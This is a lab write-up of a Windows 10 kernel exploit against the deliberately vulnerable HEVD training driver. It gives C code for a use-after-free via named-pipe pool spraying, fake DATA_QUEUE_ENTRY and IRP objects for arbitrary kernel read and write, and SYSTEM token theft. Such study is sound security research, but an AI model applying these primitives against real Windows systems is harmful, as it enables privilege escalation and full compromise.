# HEVD - UAF NONPAGEDNX VULNERABILITY

## INTRODUCTION

Searching the internet about windows kernel exploitation i have found a lot of resources related to HackSysExtremeVulnerableDriver in Windows 7. However, i haven't found many references related to HackSysExtremeVulnerableDriver in Windows 10, so i have decided to dig into Windows 10 modern kernel exploitation and develop an exploit for the Use After Free vulnerability in NonPagedNX pool affecting this driver.

## THE VULNERABILITY

The vulnerability is pretty simple to understand. There are two IOCTL calls that are related with the UaF vulnerability:

#### AllocateUaFObjectNonPagedPoolNX:
This IOCTL (0x222053) allocates an object in the NonPagedNx pool with the tag "Hack". The size of the object is 0x60 bytes and the returned pointer by ExAllocatePoolWithTag is stored in a global variable called g_UseAfterFreeObjectNonPagedPoolNx:

![Image](/images/AllocatePoolWithTag_0x222053.jpg)

#### FreeUaFObjectNonPagedPoolNx:

Calling the IOCTL (0x22205B) just free the previous allocated object:

![Image](/images/FreePoolWithTag_0x22205B.jpg)

There are other IOCTL calls related to this vulnerability like AllocateFakeObjectNonPagedPoolNX or UseUafObjectNonPagedPoolNX that are not needed. 
One of the main advantages of this vulnerability is that the attacker can control the time between the free and the use and that the attacker can free the vulnerable object multiple times.

## EXPLOITATION STRATEGY

Reading about Nonpaged pool exploitation in modern Windows kernel, the use of named pipes is a common strategy for grooming the pool. Specifically, using named pipes, objects of type DATA_QUEUE_ENTRY (https://doxygen.reactos.org/d8/d97/struct__NP__DATA__QUEUE__ENTRY.html) can be created in this memory space with the desired size and it is also possible to control part of the content of the object (except the header). 
These objects are tagged in the pool with the NpFr tag and can be created using the code below:

```
printf("[+] Spray 10,000 DATA_QUEUE_ENTRY objects in Non-Paged Pool\n");
	for (i = 0; i < 10000; i++) {

		PipeArrayB[i].Write = CreateNamedPipe(
			L"\\\\.\\pipe\\exploit_HEVD_UAF2",
			PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED,
			PIPE_TYPE_BYTE | PIPE_WAIT,
			PIPE_UNLIMITED_INSTANCES,
			DATA_ENTRY,
			DATA_ENTRY,
			0,
			0);
		PipeArrayB[i].Read = CreateFile(L"\\\\.\\pipe\\exploit_HEVD_UAF2", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);


		res = WriteFile(PipeArrayB[i].Write, payload, DATA_ENTRY, &resultLength, NULL); //Allocate 0x60 bytes en NpFr POOL

		if (!res)
		{
			printf("[-] Failed to writeFile payloadMid %d", GetLastError());
			return;
		}

	}
  ```
  
  In this code example, the body of the DATA_QUEUE_ENTRY object is 0x28. This is the size of the data written in the entry. The object has also a header of 0x30 bytes that is represented by the struct below:
  
   ```
  struct DATA_QUEUE_ENTRY {
    LIST_ENTRY NextEntry;
    _IRP* Irp;
    _SECURITY_CLIENT_CONTEXT* SecurityContext;
    uint32_t EntryType;
    uint32_t QuotaInEntry;
    uint32_t DataSize;
    uint32_t x;
    char Data[];
}
 ```
 
So the total size of the object in memory is 0x58. This almost fit the size of the object (0x60) used by HEVD, but from the prespective of the memory manager both objects are of the same size. For now, just mention that the DataSize field stores the size of the data written in the DATA_QUEUE_ENTRY of the named pipe with the WriteFile API. The char data[] array includes the written data. 
Using the vulnerability, we can potentially free a space of 0x60 bytes in pool memory and reclaim this space using a fake DATA_QUEUE_ENTRY object (NpFr tag). The size of 0x60 indicate that the  Segment Heap backend used by the aplication is LFH.

The strategy to achieve this goal is detailed below:

####  1. Spray the pool with 10000  DATA_QUEUE_ENTRY objects:

```
printf("[+] Spray 10,000 DATA_QUEUE_ENTRY objects in Non-Paged Pool\n");
	for (i = 0; i < 10000; i++) {

		PipeArrayB[i].Write = CreateNamedPipe(
			L"\\\\.\\pipe\\exploit_HEVD_UAF2",
			PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED,
			PIPE_TYPE_BYTE | PIPE_WAIT,
			PIPE_UNLIMITED_INSTANCES,
			DATA_ENTRY,
			DATA_ENTRY,
			0,
			0);
		PipeArrayB[i].Read = CreateFile(L"\\\\.\\pipe\\exploit_HEVD_UAF2", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);


		res = WriteFile(PipeArrayB[i].Write, payload, DATA_ENTRY, &resultLength, NULL); //Allocate 0x60 bytes en NpFr POOL

		if (!res)
		{
			printf("[-] Failed to writeFile payloadMid %d", GetLastError());
			return;
		}

	}
  ```
  
  After this spray, the nonpaged pool memory should looks like:
  
  ![Image](/images/spray1.jpg)
  
  ####  2. Create holes
  
After this, we create holes by freeing some of the DATA_QUEUE_ENTRY objects. To free the objects we just need to call CloseHandle() API using as parameter the read and write handles returned by CreateFile() and CreatedNamedPipe():

   ```
void CreateHoles() {

	UINT i = 0;
	DWORD readBytes = 0;

	for (i = 0; i < 10000; i+=4) {
		if (!CloseHandle(PipeArrayB[i].Read) && !CloseHandle(PipeArrayB[i].Write)) {
			printf("Failed to Close Handle of Objects in readPipeArrayB and writePipeArrayB: 0x%X\n", GetLastError());
			return;
		}

	}
	printf("[+] Close handles to create holes in Non-Paged Pool\n");
}
 ```
 
 The memory layout after freeing objects is showed below:
 
   ![Image](/images/holes1.jpg)
   
At this point, we have 0x60 size holes in the NonPaged pool memory. The goal now is to allocate the g_UseAfterFreeObjectNonPagedPoolNx (HEVD.sys) in one of this holes by calling the 0x222053 IOCTL and then free this object calling the IOCTL 0x22205B:
 
```
printf("[+] Allocate HEVD object\n");
DeviceIoControl(hevd, IOCTL_ALLOC_NX, NULL, 0, NULL, 0, &BytesReturned, NULL);
printf("[+] Free HEVD object\n");
//free  HEVD object
DeviceIoControl(hevd, IOCTL_FREE_NX, NULL, 0, NULL, 0, &BytesReturned, NULL);
 ```
   
The memory layout at this point is showed below:
   
![Image](/images/HEVD.JPG)
      
      
      
####  3. Reclaim freed HEVD object
       
Right now we need to reclaim the freed HEVD object spraying again with NpFr (DATA_QUEUE_ENTRY) objects. The code is the that used previously in step 1.
    
It's important to use the same unique pipe name that was used in the first spray. The reason of this will be explained in the next section and it's related with the cleanup process. At this point the memory layout is showed below:
    
![Image](/images/AllocNpFr.jpg)
      
In the image above we see in green that the previously allocated HEVD object has been filled by a DATA_QUEUE_ENTRY object (tagged with NpFr).
      
####  4. Free DATA_QUEUE_ENTRY object
   
 Now we can trigger the free IOCTL 0x22205B  again to free this NpFr object obtaining the memory laylout below:
      
![Image](/images/freeNpFr.jpg)   

####  5. Spray fake objects

The next step is to perform a third spray in order to store a fake NpFr object in the previously freed NpFr hole using the IOCTL 0x222053. This is done with the code below:
   
```
  void SprayNonPagedPool(LPVOID fakeEntry)
{
	BOOL res = 0;
	DWORD BytesReturned = 0;

	printf("[+] Spraying fake objects\n");

	for (int i = 0; i < 5000; i++)
	{
		res = DeviceIoControl(hevd, IOCTL_ALLOC_FAKE_OBJ_NX, fakeEntry, sizeof(fakeEntry), NULL, 0, &BytesReturned, NULL);

		if (!res)
		{
			DWORD err = GetLastError();
			printf("[+] DeviceIoControl, error: %p\n", err);
		}
	}
}
```
 
Now the memory layout is:

![Image](/images/fakeobject2.jpg)   

Therefore we can place a fake DATA_QUEUE_ENTRY object in memory and we can interact from user-land with it using its related handler and Windows APIs. How we build this fake object is the key to achieve arbitrary red and write but we first need to locate the handler related with the fake object. This can be done writting specific bytes (magic bytes) in the last spray using the IOCTL 0x222053 and iterating through all the handlers until we get a match when reading the content of the entry using the API PeekNamedPipe():

 ```
PIPE_HANDLES DetectPipe()
{
	BOOL res = 0;
	UCHAR payload[DATA_ENTRY]; //0x60 blocks
	memset(payload, 0x44, sizeof(payload));
	DWORD resultLength = 0;
	DWORD magic = 0x45464748;
	DWORD extract = 0x0;

	for (int i = 0; i < 10000; i++) //iterate through all the
	{

		res = PeekNamedPipe(PipeArrayB_2[i].Read, payload, DATA_ENTRY, &resultLength, 0, 0);

		extract = *(DWORD*)(payload);
		if (extract == magic)
		{
			printf("[+] Corrupted DATA_QUEUE_ENTRY found!\n");
			return PipeArrayB_2[i];
		}

		if (!res)
		{
			printf("[-] error reading in pipe\n");
			return { 0 };
		}
	}
	printf("[+] Find corrupted PIPE\n");
}

 ```

For this action we need to use PeekNamedPipe instead of ReadFile because when reading all the bytes of a specific entry the entry is freed and we don't want this. Nevertheless with the PeekNamedPipe the QuotaInEntry of the DATA_QUEUE_ENTRY is not decremented and therefore the entry is not freed, which lead in kernel security check because we have corrupted the flink and blink pointers of the DATA_QUEUE_ENTRY object. For more information of this KERNEL SECURITY CHECK read https://msrc-blog.microsoft.com/2013/11/06/software-defense-safe-unlinking-and-reference-count-hardening/#:~:text=Safe%20unlinking%20%28and%20safe%20linking%29%20are%20a%20set,as%20a%20list%20entry%20unlink%20or%20link%2C%20occurs.

## ARBITRARY MEMORY READ

In order to understand how we can achieve arbitrary memory read we need to understand how NPFS.sys driver works internally and what objects are involved when performing reading operations in a Named pipe. Analyzing the DATA_QUEUE_ENTRY structure we notice some intersting fields:

```
  struct DATA_QUEUE_ENTRY {
    LIST_ENTRY NextEntry;
    _IRP* Irp;
    _SECURITY_CLIENT_CONTEXT* SecurityContext;
    uint32_t EntryType;
    uint32_t QuotaInEntry;
    uint32_t DataSize;
    uint32_t x;
    char Data[];
}
 ```
 
The field "EntryType" differentiate two types of entries:

	- Buffered
	- Unbuffered
	
When creating a DATA_QUEUE_ENTRY using the WriteFile API we find the content below in memory:

```
kd> dd ffffd687a84c5450
ffffd687`a84c5450  88284ea8 ffffc38d 88284ea8 ffffc38d (flink + blink)
ffffd687`a84c5460  00000000 00000000 00000000 00000000 (irp + security Context)
ffffd687`a84c5470  00000000 00000028 00000028 fffff806 (EntryType + Quota Entry | DataSize + x)
ffffd687`a84c5480  44444444 44444444 44444444 44444444
ffffd687`a84c5490  44444444 44444444 44444444 44444444
ffffd687`a84c54a0  44444444 44444444 007d003e 84894802
ffffd687`a84c54b0  0a078000 7246704e 072aefd6 19bb00e9
 ```
 
As you can see, the EntryType is zero, and IRP is also zero. This indicate that buffered entries are not using IRP object. Analyzing Npfs!NpReadDataQueue we check that for Buffered entries the char Data[] array is used. However, in the case of Unbuffered entries the AssociatedIRP.SystemBuffer field of the IRP structure (IRP+0x18) is used. So, if we are able to build a unbuffered entry with a fake IRP structure we can potentially read the content of the address written in the AssociatedIRP.SystemBuffer field of the fake IRP structure.

![Image](/images/unbuffered_buffered.jpg)   

As you can notice in the image above, the DATA_QUEUE_ENTRY is extracted from the DATA_QUEUE structure. This DATA_QUEUE structure stores all the information related with the DATA_QUEUE_ENTRY objects stored in the queue like quota used, number of entries stored in the queue, etc:

```
typedef struct _NP_DATA_QUEUE
 {
     LIST_ENTRY Queue;
     ULONG QueueState;
     ULONG BytesInQueue;
     ULONG EntriesInQueue;
     ULONG QuotaUsed;
     ULONG ByteOffset;
     ULONG Quota;
 } NP_DATA_QUEUE, *PNP_DATA_QUEUE;
 ```
 
 It's important to mention that DATA_QUEUE structure is part of the context structure where all the information related to the Named pipe client connection is stored.
 
 ```
  typedef struct _NP_CCB
 {
     NODE_TYPE_CODE NodeType;
     UCHAR NamedPipeState;
     UCHAR ReadMode[2];
     UCHAR CompletionMode[2];
     SECURITY_QUALITY_OF_SERVICE ClientQos;
     LIST_ENTRY CcbEntry;
     PNP_FCB Fcb;
     PFILE_OBJECT FileObject[2];
     PEPROCESS Process;
     PVOID ClientSession;
     PNP_NONPAGED_CCB NonPagedCcb;
     NP_DATA_QUEUE DataQueue[2];
     PSECURITY_CLIENT_CONTEXT ClientContext;
     LIST_ENTRY IrpList;
 } NP_CCB, *PNP_CCB;
  ```
  
Let's see this relation in WINDBG. In the following image we can see the DATA_QUEUE_ENTRY object:
  
![Image](/images/windbg_dqe.png)     
  
The FLINK pointer is pointing to the DATA_QUEUE in the CCB structure. This is because there is only a DATA_QUEUE_ENTRY in the queue. If more DATA_QUEUE_ENTRY's are added, the flink will point to the next entry instead the DATA_QUEUE object:

![Image](/images/windbg_ccb.png)  

The following diagram shows this relationship:

![Image](/images/dqe_ccb_relation.png)  

Now that we understand a little bit more the relation between objects, lets check the end of te while loop of the Npfs!NpReadDataQueue function. This loop is going to iterate over all the DATA_QUEUE_ENTRY objects stored in the DATA_QUEUE using the LIST_ENTRY field of the DATA_QUEUE_ENTRY header as showed below:

![Image](/images/iterator_read.png)  

So the peek operation can potentially read data of several entries in one operation. Whit this understaing of the NPFS driver internals we can better build a fake object that help us to achieve our goal, the arbitrary memory read.

Because replacing the freed object with a fake unbuffered DATA_QUEUE_ENTRY in kernel is tricky as we need a valid IRP, we can insted place a buffered DATA_QUEUE_ENTRY which its LIST_ENTRY flink field points to a unbuffered DATA_QUEUE_ENTRY with a fake IRP both in userland. Because SMAP is not fully enabled in the Windows kernel (https://github.com/microsoft/MSRC-Security-Research/blob/master/papers/2020/Evaluating%20the%20feasibility%20of%20enabling%20SMAP%20for%20the%20Windows%20kernel.pdf ) we can read or write user-land data from kernel-land without problems. 

This way, when reading the fake entry using its associated handler in the PeekNamedPipe() we can read from the crafted user-land unbuffered entry. This strategy looks like:

![Image](/images/arbitrary_memory_read_strategy.png)  

 this strategy looks in the exploit code like:
 
 
 ```
void LeakMem(HANDLE victimPIPE, uint64_t addr, size_t len, char* data) {
	static char* buf = (char*)malloc(len + 0x1 + LEAKED_DATA_OFFSET);
	DATA_QUEUE_ENTRY* dqe = (DATA_QUEUE_ENTRY*)USER_DATA_ENTRY_ADDR;
	DWORD read;

	IRP* irp = (IRP*)(USER_DATA_ENTRY_ADDR + 0x1000);
	memset(dqe, 0, sizeof(DATA_QUEUE_ENTRY));
	dqe->EntryType = 1;
	dqe->DataSize = -1;
	dqe->Irp = irp;
	irp->AssociatedIrp = (PVOID)addr;

	PeekNamedPipe(victimPIPE, buf, len + LEAKED_DATA_OFFSET, &read, 0, 0);
	memcpy(data, buf, len + LEAKED_DATA_OFFSET);
	memset(buf, 0x00, len + LEAKED_DATA_OFFSET); //init
}
  ```

We first need to map with VirtualAlloc a user-land address that will hold the fake user-land unbuffered DATA_QUEUE_ENTRY as well as the fake IRP. As you can see in the code above the EntryType is equal to 1 (unbuffered) and the IRP field is pointing to a fake user-land IRP which its AssociatedIRP.SystemBuffer field is the address from which we are going to read memory.

So now the only step that is missing is the fake buffered DATA_QUEUE_ENTRY that need to be sprayed to fill the freed hole (step 5 in exploitation strategy). The content of thes entry looks like:

 
 ```
DATA_QUEUE_ENTRY dqe = { 0 };

dqe.Flink = USER_DATA_ENTRY_ADDR;
dqe.Blink = USER_DATA_ENTRY_ADDR;
dqe.EntryType = 0x0; //NO IRP
dqe.DataSize = sizeof(DATA_QUEUE_ENTRY) + FAKE_OBJ_SIZE + 0x20;

memcpy(InputBuffer, &dqe, sizeof(DATA_QUEUE_ENTRY));
*(ULONGLONG*)(InputBuffer + 0x30) = (ULONGLONG)((ULONGLONG)0x4142434445464748); //magic sequence = 0x4142434445464748
*(ULONGLONG*)(InputBuffer + 0x38) = (ULONGLONG)((ULONGLONG)0x4142434445464748);
*(ULONGLONG*)(InputBuffer + 0x40) = (ULONGLONG)((ULONGLONG)0x4142434445464748);
*(ULONGLONG*)(InputBuffer + 0x48) = (ULONGLONG)((ULONGLONG)0x4142434445464748);
*(ULONGLONG*)(InputBuffer + 0x50) = (ULONGLONG)((ULONGLONG)0x4142434445464748);
memcpy(DataEntrySpray, InputBuffer, 0x58);	
  ```
  
This fake buffered DATA_QUEUE_ENTRY will be in the kernel and its flink pointer points to the unbuffered user-land DATA_QUEUE_ENTRY. The DataSize should be enough to leak the memory content of the next entry as well as trigger the read of the user-land entry pointed by flink.
At this moment we have achieved the arbitrary memory read and we can start leaking data that help in our goal.

## WHAT TO READ

####  1. Leak pointers close to the target chunk

First of all, it's always very helpful to know the kernel address of the object we control. Because we can leak the memory of the next entry, we can navigate to the CCB object though its flink pointer and then get the memory address of the next DATA_QUEUE_ENTRY object. With this pointer we just need to substract the size of the entry plus the size of the pool header and we get the kernel address of the controlled object:

 
 ```
char data[0x1000];
LeakMem(PIPEhandles.Read, (uint64_t)UserAddr, 0xF58, data);
//cleanUp
DWORD zero = 0;
uint64_t cleanUpEntryTipe = USER_DATA_ENTRY_ADDR + 0x20;
memcpy((PVOID)(USER_DATA_ENTRY_ADDR + 0x20), &zero, sizeof(zero));

DATA_QUEUE_ENTRY* next_chunk_flink = (DATA_QUEUE_ENTRY*)*(ULONGLONG*)(data + 0x40);
printf("[+] Leaked Flink of next chunk: %p\n", next_chunk_flink);

//extract next_chunk_flink content
LeakMem(PIPEhandles.Read, (uint64_t)&next_chunk_flink->Blink, 8, data);
uint64_t next_chunk_addr = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);

printf("[+] Address of next chunk: %p\n", next_chunk_addr);

uint64_t current_chunk_addr = next_chunk_addr - DATA_ENTRY_SIZE - POOL_HEADER_SIZE;

printf("[+] Address of current chunk: %p\n", current_chunk_addr);
 ```

The result of the first call to LeakMem looks like this:

![Image](/images/leakmem1.png)  

####  2. Leak CCB address related with the target chunk

It is also interesting to find the address of the CCB structure related to the next DATA_QUEUE_ENTRY. We can get this address just substracting the 0xa8 offset to the leaked flink pointer:

 ```
uint64_t ccbAddr = (uint64_t)next_chunk_flink – 0xa8;
 ```
 
This CCB structure has a LIST_ENTRY field that allow us to navigate through all the CCB structures related with the Named Pipe. With this, we can recover the overwritten flink and blink pointers and avoid the KERNEL SECURITY CHECK when this corrupted fields are unlinked in process termination (https://msrc-blog.microsoft.com/2013/11/06/software-defense-safe-unlinking-and-reference-count-hardening/#:~:text=Safe%20unlinking%20%28and%20safe%20linking%29%20are%20a%20set,as%20a%20list%20entry%20unlink%20or%20link%2C%20occurs)
the code below allows to navigate through this list and recover the CCB address related with the overwritten DATA_QUEUE_ENTRY:

 ```
void findCCB(uint64_t* overwrittenQueueDataEntryCCB, uint64_t ccbAddr, uint64_t current_chunk_addr)
{
	char data[0x1000];
	memset(data, 0x0, 0x1000);
	bool CcbFound = false;
	uint64_t ccbAddrTmp = 0;
	uint64_t NextCcb = 0;
	uint64_t ccbAddrDataEntryPtr = 0;
	ccbAddrTmp = ccbAddr + 0x18; //flink = ccbAddr + 0x18; blink = ccbAddr + 0x20
	int iter = 0;

	while (!CcbFound)
	{
		iter++;
		LeakMem(PIPEhandles.Read, ccbAddrTmp, 0x8, data); //extract the next CCB address (Flink of LIST_ENTRY)
		NextCcb = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		LeakMem(PIPEhandles.Read, NextCcb + 0x90, 0x8, data); //extract DATA_QUEUE_ENTRY pointer in the CCB object
		ccbAddrDataEntryPtr = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		if (ccbAddrDataEntryPtr == current_chunk_addr) //if the DATA_QUEUE_ENTRY pointed by the CCB object is the previously calculated overwritten DATA_QUEUE_ENTRY chunk address, we found the CCB related to the overwritten DATA_QUEUE_ENTRY
		{
			CcbFound = true;
			*overwrittenQueueDataEntryCCB = NextCcb;
		}

		ccbAddrTmp = NextCcb;

		if (iter > 500000)
			break;

	}
}
 ```
 
Because we have calculated the current DATA_QUEUE_ENTRY address, in each iteration through the CCB linked list we can compate this value with the DATA_QUEUE_ENTRY address stored inside the DATA_QUEUE fields of the CCB structure. If we get a match, then we have found the CCB address which address were placed in the DATA_QUEUE_ENTRY that was overwritten to achieve the arbitrary memory read.

####  3. Leak IRP structure
	
At this point we need to leak a valid IRP structure for two reasons. The first reason is because one way to achieve arbitrary memory write is abusing an internal freature related to IRP processing. The second reason is because we need to locate the EPROCESS kernel structure related with the current process as well as the EPROCESS kernel structure related with the SYSTEM process in order to copy the token from the SYSTEM process to the current process and achieve EoP.

We have seen that unbuffered entries are created with an associated IRP which holds the data of the entry. Let's examine the NPFS.sys driver to see how is possible to create this type of entries from userland. If you check the npfs!NpAddDataQueueEntry function you can see that the fifth parameter specifies the type of DATA_QUEUE_ENTRY object. Looking for references to this function we see that is called from Npfs!NpInternalWrite using a hardcoded value of 1 in the fifth parameter.

![Image](/images/5param_1.png)  

From Npfs!NpCommonWrite the value of the fifth parameter is zero:

![Image](/images/5param_0.png)  

So we confirm that unbuffered entries are created when calling  Npfs!NpInternalWrite. Looking for references to this function you can verify that is called from npfs!NpCommonFileSystemControl:

![Image](/images/NpInternalWrite.png)  

This FSCTL can be called from userland using the code below:

 ```
pipeHandle2.Write = CreateNamedPipe(
		L"\\\\.\\pipe\\exploit_HEVD_UAF2",
		PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED,
		PIPE_TYPE_BYTE | PIPE_WAIT,
		PIPE_UNLIMITED_INSTANCES,
		DATA_ENTRY,
		DATA_ENTRY,
		0,
		0);
pipeHandle2.Read = CreateFile(L"\\\\.\\pipe\\exploit_HEVD_UAF2", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);

//Create unbuffered DQE
NtFsControlFile(pipeHandle2.Write, 0, 0, 0, &isb, 0x119FF8, irp_data, DATA_ENTRY_SIZE, 0, 0);

 ```
 
Now the next goal is to locate in memory the recently created unbuffered entry an its related IRP object. The approach here is more or less the same that the preivously used to recover the overwrriten flink/blink pointers in the target chunk. 
 
This time we are going to iterate again through the CCB linked list to check every DATA_QUEUE_ENTRY in each client context block and verify if this entry has an IRP. When we get a match, leak the IRP pointer. The code to achieve this is showed below:


 ```
void findIrpAddres(uint64_t* IrpAddr, uint64_t ccbAddr, uint64_t previousIRP)
{
	char data[0x1000];
	memset(data, 0x0, 0x1000);
	bool IrpFOund = false;
	uint64_t ccbAddrTmp = 0;
	uint64_t NextCcb = 0;
	ccbAddrTmp = ccbAddr + 0x18; //flink = ccbAddr + 0x18; blink = ccbAddr + 0x20
	uint32_t iter = 0;

	while (!IrpFOund)
	{
		iter++;
		LeakMem(PIPEhandles.Read, ccbAddrTmp, 0x8, data); //extract the next CCB address (Flink of LIST_ENTRY)
		NextCcb = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		LeakMem(PIPEhandles.Read, NextCcb - 0x18 + 0xe8, 0x8, data); //extract DATA_QUEUE_ENTRY pointer in the CCB object
		*IrpAddr = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		if (*IrpAddr != NULL && *IrpAddr != previousIRP) //if the DATA_QUEUE_ENTRY pointed by the CCB object is the previously calculated overwritten DATA_QUEUE_ENTRY chunk address, we found the CCB related to the overwritten DATA_QUEUE_ENTRY
		{
			IrpFOund = true;
		}

		ccbAddrTmp = NextCcb;

		if (iter > 500000)
			break;

	}
}

 ```
Now that we have an IRP pointer we can leak the full content of the IRP structure. This is what we need in order to build a fake IRP with valid fields as well as leak THREAD information that would help us to get the EPROCESS token of our current process as well as the SYSTEM procress.

####  4. Leak EPROCESS information

If we check the IRP structure fields in MSDN we notice that there is a LIST_ENTRY field related to Threads using the IRP:

![Image](/images/msdnIRP.png)  

Let's check in WINDBG where are the values we are interested to leak:

![Image](/images/windbgIRP.png)  

Marked in red we have the ThreadListEntry.flink and ThreadListEntry.blink. Examining both addresses we se that points inside a _ETHREAD object:

![Image](/images/_poolThread.png)  

Examining the current process we can get the exact address where the _ETHREAD object starts:

![Image](/images/_processWindbg.png)  

Now that we have the THREAD address we can parse the different fields of the _EHTREAD structure with Windows symbols:

![Image](/images/_ETHREAD.png)  

As you can see in the screen aboce the IrpList contains the pointer to our leaked IRP. If we continue to the offset 0x4e0 we find a LIST_ENTRY related with other threads.

![Image](/images/_threadlistentry.png)  

Substracting 0x2C8 to this address we can find a pointer inside the _ETHREAD object to the _EPROCESS object of the current user-land process. The _ETHREAD structure can change between different Windows versions so this offset could be different in newer or older versions.

![Image](/images/_KPROCESS.png)  

LooKing into the _EPROCESS pointer we can leak the PID of the current process as well as the pointer of the ActiveProcessLinks LIST_ENTRY. 

![Image](/images/__EPROCESS.png)  

Using all this information we can iterate through this linke list until we get the _EPROCESS structure of the SYSTEM process (PID=4). The following code is used to return the process address of a supplied PID.


 ```
uint64_t GetProcessById(HANDLE handle, uint64_t first_process, uint64_t pid) {
	uint64_t current_pid = 0;
	uint64_t current_process = first_process;
	char data[0x1000];
	memset(data, 0x0, 0x1000);
	while (1) {
		LeakMem(PIPEhandles.Read, (uint64_t)current_process + PID_OFFSET, 0x8, data);
		current_pid = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		if (current_pid == pid)
			return current_process;

		LeakMem(PIPEhandles.Read, (uint64_t)current_process + ACTIVELINKS_OFFSET, 0x8, data);
		current_process = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		current_process -= PID_OFFSET + 0x8;

		if (current_process == first_process)
			return 0;
	}
}
 ```

Here we only need to replace the current _EPROCESS token with the SYSTEM _EPROCESS token to get SYSTEM privileges. For this we need a write primitive.


## ARBITRARY WRITE

To convert the UAF in arbitrary write we need to take a look into the IRP structure and how this object is processed in the NPFS.sys driver. Looking in MSDN we can notice the following information related to the SystemBuffer and UserBuffer fields of the IRP structure:

![Image](/images/__MSDNIRP.png)  

As you can see, then NPFS complete the request related with the IRP structure the content of the SystemBuffer will be the UserBuffer. Because we can trigger the UAF to place a fake unbuffered DATA_QUEUE_ENTRY pointing to a fake IRP object that we control, we can potentially abuse this behaviour to write the SYSTEM token into the current process _EPROCESS structure. 

However, the fake IRP object should be in kernel memory space because the IRP completition happens inside the Ntoskrnl.exe binary. Specifically, the memory copy operation happens in the IopCompleteRequest+0x286028:

![Image](/images/IDA_IRP.png)


In the memmove function, the IRP+0x70 is the UserBuffer field and the IRP+0x18 is the systemBuffer. After the memmove operation if the *v8&0x20 condition is true, the SystemBuffer is freed. Because this SystemBuffer points to the SYSTEM token instead a valid pool object, this cause a crash inside ExFreePoolWithTag(). 

We need carefully craft a valid flag that pass all the previous conditions until the program reach the memmove function and avoid the free of the SystemBuffer. The only value i found is 0x60850:

 ```
irp->Flags = 0x60850;
irp->AssociatedIrp = source_address;
irp->UserBuffer = destination_address;

 ```

The rest of the IRP structure is the same as the previously lekead IRP. At this point we just need to place this fake IRP in kernel memory using the code below:

  ```
 pipeHandle3.Write = CreateNamedPipe(
	L"\\\\.\\pipe\\exploit_HEVD_UAF2",
	PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED,
	PIPE_TYPE_BYTE | PIPE_WAIT,
	PIPE_UNLIMITED_INSTANCES,
	DATA_ENTRY,
	DATA_ENTRY,
	0,
	0);
pipeHandle3.Read = CreateFile(L"\\\\.\\pipe\\exploit_HEVD_UAF2", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);

//Create unbufferentry
NtFsControlFile(pipeHandle3.Write, 0, 0, 0, &isb, 0x119FF8, irp_object, sizeof(IRP) + 0x200, 0, 0);


uint64_t FakeIrpAddr = 0;
//search kernel address of IRP created during NtFsControlFile 0x119FF8 call
foundIrpInDataEntry(&FakeIrpAddr, ccbAddr, IrpAddr);
 printf("[+] IRP found! Address of IRP: %p\n", FakeIrpAddr);

uint64_t IrpSystemAddr = 0;
LeakMem(PIPEhandles.Read, FakeIrpAddr+0x18, 0x8, data); //extract SystemAddress from IRP
//systemAdress points to irp_object injected in NtFsControlFile
IrpSystemAddr = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
printf("[+] Address of IrpSystemAddr: %p\n", IrpSystemAddr);

	
//PrepareDataEntryForWrite(&dqe, (IRP*)IrpSystemAddr, ARBITRARY_WRITE_SIZE);
thread_list[0] = thread_list[1] = IrpSystemAddr + offsetof(IRP, ThreadListEntry.Flink);
 ```
 
Because the fake IRP is inside the real IRP used by the unbuffered DATA_QUEUE_ENTRY object, we need to leak the SystemAddress of this real IRP to get the SystemAddress which is pointing to the fake IRP structure. Now we only need to fake a new DATA_QUEUE_ENTRY object with a pointer to the fake IRP structure and the fixed flink and blink pointers. Then, trigger the UAF again to place this new object inside the target hole.

  ```
//Prepare DATA QUEUE ENTRY with lost data to avoid LIST_ENTRY KeBugCheck
dqe = { 0 };

//dqe.Flink = (uint64_t)dqe;
dqe.Flink = overwrittenQueueDataEntryCCB + 0x90; //0x90 offset between the beginning of CCB chunk in nonpagedpool and DATA_QUEUE_ENTRY pointer in CCB object.
dqe.Blink = overwrittenQueueDataEntryCCB + 0x90;
dqe.Irp = (IRP*)IrpSystemAddr;
dqe.SecurityContext = 0;//File_object1 - 0xa0; //0xa0 offset between the object pointer and the beginning of the FILE chunk in nonpagedpool
dqe.EntryType = 0x0; //NO IRP  NextCcb+0xd8
dqe.DataSize = 0x28;
dqe.QuotaInEntry = 0x8;

memcpy(InputBuffer, &dqe, sizeof(DATA_QUEUE_ENTRY));
*(ULONGLONG*)(InputBuffer + 0x30) = (ULONGLONG)((ULONGLONG)0x4942434445464749);
*(ULONGLONG*)(InputBuffer + 0x38) = (ULONGLONG)((ULONGLONG)0x4942434445464749);
*(ULONGLONG*)(InputBuffer + 0x40) = (ULONGLONG)((ULONGLONG)0x4942434445464749);
*(ULONGLONG*)(InputBuffer + 0x48) = (ULONGLONG)((ULONGLONG)0x4942434445464749);
*(ULONGLONG*)(InputBuffer + 0x50) = (ULONGLONG)((ULONGLONG)0x4942434445464749);
memcpy(DataEntrySpray, InputBuffer, 0x58);

DeviceIoControl(hevd, IOCTL_FREE_NX, NULL, 0, NULL, 0, &BytesReturned, NULL); //Free NpFr DATA_QUEUE_ENTRY After leak

//prepare a crafter DATA_QUEUE_ENTRY with the lost flink and blink when original DATA QUEUE ENTRY was reclaimed with a fake object to avoid bugcheck
SprayNonPagedPool(DataEntrySpray); //Reclaim NpFr DATA_QUEUE_ENTRY

 ```
 
 Now we just need to read on the pipe to trigger the IofCompleteRequest inside the npfs!NpFastRead function:
 
 ![Image](/images/SHELL.png)
 
 
 ## REFERENCES
 
 1. https://doxygen.reactos.org/d4/d30/drivers_2filesystems_2npfs_2npfs_8h_source.html
